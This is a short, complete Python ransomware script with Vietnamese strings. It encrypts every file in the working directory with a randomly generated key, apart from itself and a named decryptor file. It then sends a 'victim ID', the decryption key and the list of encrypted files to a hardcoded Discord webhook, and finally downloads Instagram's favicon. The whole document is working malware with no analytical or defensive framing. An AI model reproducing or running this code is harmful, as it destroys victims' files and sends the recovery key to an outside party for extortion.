import os
from cryptography.fernet import Fernet
from discord import SyncWebhook
import random
import string
from datetime import datetime
from datetime import date
import os
from cryptography.fernet import Fernet
import hashlib
import base64
from getpass import getuser
import requests

get_user = getuser()

letters = string.digits
so = ( ''.join(random.choice(letters) for i in range(10)) )
letters2 = string.ascii_uppercase
chu = ( ''.join(random.choice(letters2) for i in range(10)) )
ma_may = 'vduc-'+so+chu

currentDateAndTime = datetime.now()
gio = currentDateAndTime.hour
phut = currentDateAndTime.minute
giay = currentDateAndTime.second
date = date.today()

#gen pass haha
# Tạo một chuỗi gồm 5 ký tự ngẫu nhiên trong danh sách các ký tự được cho trước
random_chars = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
# Tạo một chuỗi kết hợp giữa chuỗi ngẫu nhiên và các ký tự định dạng
passhaha = f"{random_chars[:2]}-{random_chars[2:]}"

password = f"{passhaha}".encode('utf-8')
key = hashlib.sha256(password).digest()
cipher = Fernet(base64.urlsafe_b64encode(key))
            

files = []
for file in os.listdir():
    if file == "ma_hoa_is_dangerous.py" or file == "giai_virut.py" :
        continue
    if os.path.isfile(file):
        files.append(file)
for file in files:
    with open(file, "rb") as f:
        original_data = f.read()
        encrypted_data = cipher.encrypt(original_data)

    with open(file, "wb") as f:
        f.write(encrypted_data)    

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1035924951770878002/SEoUqoDpw_t8iPS9dO5kSlLB50532Zp0aNg-eHHXhbI9U72fG1EPbiOpO-o5VjHhmggI")
contents = f'''


Hệ Thống Thông Báo 📢                                        
📅 Ngày : {date} 

⏰ Thời gian : {gio}:{phut}:{giay}                      

💻 Mã Nạn Nhân : {ma_may}

🔑 Key : {passhaha}

File đã mã hóa : {files}
'''
webhook.send(contents) 

URL = "https://instagram.com/favicon.ico"
response = requests.get(URL)
open("instagram.ico", "wb").write(response.content)